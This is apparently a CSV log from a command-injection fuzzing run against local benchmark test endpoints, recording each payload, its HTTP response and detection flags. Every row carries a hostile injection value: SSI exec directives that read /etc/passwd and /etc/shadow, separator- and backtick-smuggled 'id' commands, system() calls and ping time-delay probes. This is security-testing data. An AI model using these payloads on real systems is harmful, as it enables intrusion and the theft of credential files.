id_fuzz,url,payload,method,resp_status_code,resp_content_length,resp_time_elapsed,type_payload,payload,observation_status_code,observation_search_file_not_found,observation_search_no_such_file,observation_search_uid,observation_search_gid,observation_search_groups,observation_search_gpermission_denied,observation_search_whoami,observation_search_root,observation_daemon,observation_error,observation_exception,observation_illegal,observation_invalid,observation_fail,observation_stack,observation_access,observation_directory,observation_not_found,observation_unknown,observation_ODBC,observation_SQL,observation_quotation_mark,observation_syntax,observation_ORA,observation_111111,observation_time_delay,observation_content_length
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,$;/usr/bin/id,POST,200,91,0:00:00.003711,cmdi,$;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,POST,200,91,0:00:00.002336,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,POST,200,91,0:00:00.002515,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,91,0:00:00.002306,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,91,0:00:00.002286,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,/index.html|id|,POST,200,91,0:00:00.003160,cmdi,/index.html|id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;id;,POST,200,91,0:00:00.002205,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;id,POST,200,91,0:00:00.002587,cmdi,;id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;netstat -a;,POST,200,91,0:00:00.005250,cmdi,;netstat -a;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;id;,POST,200,91,0:00:00.003207,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,|id,POST,200,91,0:00:00.003668,cmdi,|id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,|/usr/bin/id,POST,200,91,0:00:00.002407,cmdi,|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,|id|,POST,200,91,0:00:00.002271,cmdi,|id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,|/usr/bin/id|,POST,200,91,0:00:00.002212,cmdi,|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,||/usr/bin/id|,POST,200,91,0:00:00.005623,cmdi,||/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,|id;,POST,200,91,0:00:00.002458,cmdi,|id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,||/usr/bin/id;,POST,200,91,0:00:00.002313,cmdi,||/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;id|,POST,200,91,0:00:00.002221,cmdi,;id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;|/usr/bin/id|,POST,200,91,0:00:00.006217,cmdi,;|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"
/bin/ls -al
",POST,200,91,0:00:00.003094,cmdi,"
/bin/ls -al
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"
/usr/bin/id
",POST,200,91,0:00:00.002565,cmdi,"
/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"
id
",POST,200,91,0:00:00.003027,cmdi,"
id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"
/usr/bin/id;",POST,200,91,0:00:00.003388,cmdi,"
/usr/bin/id;",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"
id;",POST,200,91,0:00:00.003564,cmdi,"
id;",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"
/usr/bin/id|",POST,200,91,0:00:00.007024,cmdi,"
/usr/bin/id|",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"
id|",POST,200,91,0:00:00.002651,cmdi,"
id|",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,";/usr/bin/id
",POST,200,91,0:00:00.003546,cmdi,";/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,";id
",POST,200,91,0:00:00.007618,cmdi,";id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"|usr/bin/id
",POST,200,91,0:00:00.003303,cmdi,"|usr/bin/id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,"|nid
",POST,200,91,0:00:00.003464,cmdi,"|nid
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,`id`,POST,200,91,0:00:00.002894,cmdi,`id`,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,`/usr/bin/id`,POST,200,91,0:00:00.006138,cmdi,`/usr/bin/id`,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a);id,POST,200,91,0:00:00.002313,cmdi,a);id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a;id,POST,200,91,0:00:00.002618,cmdi,a;id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a);id;,POST,200,91,0:00:00.004881,cmdi,a);id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a;id;,POST,200,91,0:00:00.010712,cmdi,a;id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a);id|,POST,200,91,0:00:00.004426,cmdi,a);id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a;id|,POST,200,91,0:00:00.003190,cmdi,a;id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a)|id,POST,200,91,0:00:00.002574,cmdi,a)|id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a|id,POST,200,91,0:00:00.003410,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a)|id;,POST,200,91,0:00:00.002277,cmdi,a)|id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a|id,POST,200,91,0:00:00.002213,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,|/bin/ls -al,POST,200,91,0:00:00.002226,cmdi,|/bin/ls -al,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a);/usr/bin/id,POST,200,91,0:00:00.002805,cmdi,a);/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a;/usr/bin/id,POST,200,91,0:00:00.007782,cmdi,a;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a);/usr/bin/id;,POST,200,91,0:00:00.002193,cmdi,a);/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a;/usr/bin/id;,POST,200,91,0:00:00.002105,cmdi,a;/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a);/usr/bin/id|,POST,200,91,0:00:00.002287,cmdi,a);/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a;/usr/bin/id|,POST,200,91,0:00:00.002157,cmdi,a;/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a)|/usr/bin/id,POST,200,91,0:00:00.002667,cmdi,a)|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a|/usr/bin/id,POST,200,91,0:00:00.002283,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a)|/usr/bin/id;,POST,200,91,0:00:00.002272,cmdi,a)|/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,a|/usr/bin/id,POST,200,91,0:00:00.002695,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;system('cat%20/etc/passwd'),POST,200,91,0:00:00.002572,cmdi,;system('cat%20/etc/passwd'),200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;system('id'),POST,200,91,0:00:00.003856,cmdi,;system('id'),200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,;system('/usr/bin/id'),POST,200,91,0:00:00.008779,cmdi,;system('/usr/bin/id'),200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,%0Acat%20/etc/passwd,POST,200,91,0:00:00.006747,cmdi,%0Acat%20/etc/passwd,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,%0A/usr/bin/id,POST,200,91,0:00:00.002461,cmdi,%0A/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,%0Aid,POST,200,91,0:00:00.003090,cmdi,%0Aid,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,%0A/usr/bin/id%0A,POST,200,91,0:00:00.002919,cmdi,%0A/usr/bin/id%0A,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,%0Aid%0A,POST,200,91,0:00:00.002404,cmdi,%0Aid%0A,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,& ping -i 30 127.0.0.1 &,POST,200,91,0:00:00.002239,cmdi,& ping -i 30 127.0.0.1 &,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,& ping -n 30 127.0.0.1 &,POST,200,91,0:00:00.002202,cmdi,& ping -n 30 127.0.0.1 &,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,%0a ping -i 30 127.0.0.1 %0a,POST,200,91,0:00:00.002169,cmdi,%0a ping -i 30 127.0.0.1 %0a,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,`ping 127.0.0.1`,POST,200,91,0:00:00.002201,cmdi,`ping 127.0.0.1`,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,| id,POST,200,91,0:00:00.002202,cmdi,| id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,& id,POST,200,91,0:00:00.002252,cmdi,& id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,; id,POST,200,91,0:00:00.002251,cmdi,; id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,%0a id %0a,POST,200,91,0:00:00.002405,cmdi,%0a id %0a,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,`id`,POST,200,91,0:00:00.002365,cmdi,`id`,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_27,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00741,$;/usr/bin/id,POST,200,91,0:00:00.001997,cmdi,$;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,POST,200,241,0:00:00.002583,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,POST,200,241,0:00:00.013872,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,241,0:00:00.015036,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,241,0:00:00.003310,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,/index.html|id|,POST,200,241,0:00:00.015733,cmdi,/index.html|id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,;id;,POST,200,241,0:00:00.002768,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,;id,POST,200,241,0:00:00.007877,cmdi,;id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,;netstat -a;,POST,200,241,0:00:00.003268,cmdi,;netstat -a;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,;id;,POST,200,241,0:00:00.006130,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,|id,POST,200,241,0:00:00.025231,cmdi,|id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,|/usr/bin/id,POST,200,241,0:00:00.006559,cmdi,|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,|id|,POST,200,241,0:00:00.002388,cmdi,|id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,|/usr/bin/id|,POST,200,241,0:00:00.002808,cmdi,|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,||/usr/bin/id|,POST,200,241,0:00:00.002498,cmdi,||/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,|id;,POST,200,241,0:00:00.002886,cmdi,|id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,||/usr/bin/id;,POST,200,241,0:00:00.002520,cmdi,||/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,;id|,POST,200,241,0:00:00.002995,cmdi,;id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,;|/usr/bin/id|,POST,200,241,0:00:00.013935,cmdi,;|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,"
/bin/ls -al
",POST,200,241,0:00:00.002724,cmdi,"
/bin/ls -al
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,"
/usr/bin/id
",POST,200,241,0:00:00.002261,cmdi,"
/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,"
id
",POST,200,241,0:00:00.002537,cmdi,"
id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,"
/usr/bin/id;",POST,200,241,0:00:00.003106,cmdi,"
/usr/bin/id;",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,"
id;",POST,200,241,0:00:00.003197,cmdi,"
id;",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,"
/usr/bin/id|",POST,200,241,0:00:00.002407,cmdi,"
/usr/bin/id|",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,"
id|",POST,200,241,0:00:00.002182,cmdi,"
id|",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,";/usr/bin/id
",POST,200,241,0:00:00.002240,cmdi,";/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
id_fuzz_28,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00742,";id
",POST,200,241,0:00:00.002810,cmdi,";id
",200,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
